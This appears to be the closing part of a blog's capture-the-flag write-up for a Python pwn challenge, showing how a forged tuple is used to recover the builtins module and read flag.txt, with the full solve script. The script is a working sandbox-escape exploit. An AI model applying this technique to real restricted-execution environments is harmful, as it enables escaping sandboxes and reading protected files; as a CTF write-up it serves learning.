+<p>the quote unquote ‘reference’ point i use is <code class="language-plaintext highlighter-rouge">id(0)</code>. to actually debug and find the offset i just patched in a reference to the <code class="language-plaintext highlighter-rouge">builtins</code> module in run.py as so:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">builtins</span><span class="p">[</span><span class="s">"type"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">type</span>
+<span class="n">builtins</span><span class="p">[</span><span class="s">"ref"</span><span class="p">]</span> <span class="o">=</span> <span class="n">__builtins__</span>
+</code></pre></div></div>
+
+<p>then in the solve script, we run this a few times and make sure the offset is constant.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vuln</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'offset to builtins &gt; '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">ref</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>all that’s left to do is:</p>
+
+<p>a - create a byte object whose bytestring is a pointer to builtins.</p>
+
+<p>b - calculate the <em>offset</em> from the byte object to our forged “big” tuple.</p>
+
+<p>c - index into the tuple and retrieve our reference to builtins.</p>
+
+<p>d - win!</p>
+
+<p>now, this handwaves over a lot of concerns which a more competent pwner could’ve overcome in less than 10 minutes but i, level 2 mafia rookie, stumbled over for a few hours (making sure that the offsets are correctly calculated, making sure that the tuple is placed <em>before</em> the bytestring, dynamically accommodating for essentialy ‘random’ offsets because python fucking hates me i guess).</p>
+
+<p>but the solvepath is sound, and it does work. here is the full solvescript, for posterity:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vals</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">vals</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,))</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0x30</span><span class="p">:</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+            <span class="k">break</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'rawr xd'</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">tuple</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">type</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">str</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">int</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">complex</span><span class="p">)</span>
+
+<span class="n">vuln</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'offset to builtins &gt; '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">ref</span><span class="p">)))</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'type of vuln &gt;'</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">vuln</span><span class="p">))</span>
+<span class="n">addr_to_write</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38010</span>
+
+<span class="n">obj</span> <span class="o">=</span> <span class="n">addr_to_write</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span>
+
+<span class="n">byte_overwrite</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">):</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">+=</span> <span class="n">i</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
+    <span class="n">byte_overwrite</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
+    <span class="k">if</span> <span class="mh">0x1000</span> <span class="o">&gt;</span> <span class="n">offset</span> <span class="o">&gt;</span> <span class="mh">0x0</span><span class="p">:</span> 
+        <span class="n">print_</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+        <span class="k">break</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="n">byte_overwrite</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">target_idx</span> <span class="o">=</span> <span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'target_idx &gt; '</span><span class="p">,</span> <span class="n">target_idx</span><span class="p">);</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'target_addr &gt;'</span><span class="p">,</span> <span class="n">addr_to_write</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">vuln</span><span class="p">[</span><span class="n">target_idx</span><span class="p">].</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">print_</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="closing">closing</h3>
+
+<p>funny story is that this challenge took me <em>really</em> long to solve (around 8 hours) because i kept fucking up and making a bunch of mistakes. i had the primitive very early on and just spent so much time skillissuing on really trivial parts of the challenge :S</p>
+
+<p>i wanted to make my solve libc-agnostic because i couldn’t be bothered to properly figure out how the docker container treats its libcs, so i went with the pyjail-style <code class="language-plaintext highlighter-rouge">builtins</code> retrieval.</p>
+
+<p>thanks to lucas for the fun pwn!</p>
